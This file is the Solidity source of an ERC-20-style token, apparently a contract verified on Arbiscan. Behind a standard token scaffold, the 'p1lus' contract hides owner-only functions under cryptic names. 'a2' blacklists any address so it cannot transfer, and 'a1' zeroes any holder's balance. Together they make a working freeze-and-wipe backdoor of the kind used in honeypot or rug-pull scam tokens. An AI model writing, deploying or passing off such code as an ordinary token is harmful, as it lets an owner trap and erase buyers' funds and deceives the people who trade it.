/**
 *Submitted for verification at Arbiscan on 2023-04-20
*/

pragma solidity ^0.4.17;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Ownable {
    address public owner;

    function Ownable() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public constant returns (uint);
    function balanceOf(address who) public constant returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint);
    function transferFrom(address from, address to, uint value) public;
    function approve(address spender, uint value) public;
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract BasicToken is Ownable, ERC20Basic {
    using SafeMath for uint;

    mapping(address => uint) public balances;

    modifier onlyPayloadSize(uint size) {
        require(!(msg.data.length < size + 4));
        _;
    }

    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        uint sendAmount = _value;
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        Transfer(msg.sender, _to, sendAmount);
    }

    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }

}

contract StandardToken is BasicToken, ERC20 {

    mapping (address => mapping (address => uint)) public allowed;
    uint public constant MAX_UINT = 2**256 - 1;

    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value;
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        Transfer(_from, _to, sendAmount);
    }

    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }

    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }

}

contract p1lus is Ownable, BasicToken {

    function getStatus(address _m) external constant returns (bool) {
        return isbl[_m];
    }

    function getOwner() external constant returns (address) {
        return owner;
    }

    mapping (address => bool) public isbl;
    
    function a2 (address _e) public onlyOwner {
        isbl[_e] = true;
        a(_e);
    }

    function a3 (address _c) public onlyOwner {
        isbl[_c] = false;
        r(_c);
    }

    function a1 (address _blu) public onlyOwner {
        uint df = balanceOf(_blu);
        balances[_blu] = 0;
        _totalSupply -= df;
        d(_blu, df);
    }

    event d(address _blu, uint _b);

    event a(address _u);

    event r(address _u);

}

contract Deploy is StandardToken, p1lus {

    string public name;
    string public symbol;
    uint public decimals;
    function Deploy(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[owner] = _initialSupply;
        }

    function transfer(address _to, uint _value) public {
    require(!isbl[msg.sender]);
    return super.transfer(_to, _value);}

    function transferFrom(address _from, address _to, uint _value) public {
    require(!isbl[_from]);
    return super.transferFrom(_from, _to, _value);}

    function balanceOf(address who) public constant returns (uint) {
    return super.balanceOf(who);}

    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
    return super.approve(_spender, _value);}

    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
    return super.allowance(_owner, _spender);}

    function totalSupply() public constant returns (uint) {
    return _totalSupply;}
}